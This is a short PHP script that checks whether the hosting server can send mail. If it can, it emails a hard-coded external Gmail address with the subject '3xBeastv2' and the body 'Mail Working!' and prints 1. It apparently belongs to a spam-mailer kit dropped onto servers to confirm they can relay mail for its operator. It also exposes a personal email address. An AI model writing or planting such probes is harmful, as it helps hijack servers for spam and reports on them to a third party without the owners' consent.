<?php
				if(function_exists("mail")) {
					mail('jasonnardinis@gmail.com', '3xBeastv2', 'Mail Working!');
					echo '1';
				} else {
					echo '0';
				}
			?>
		
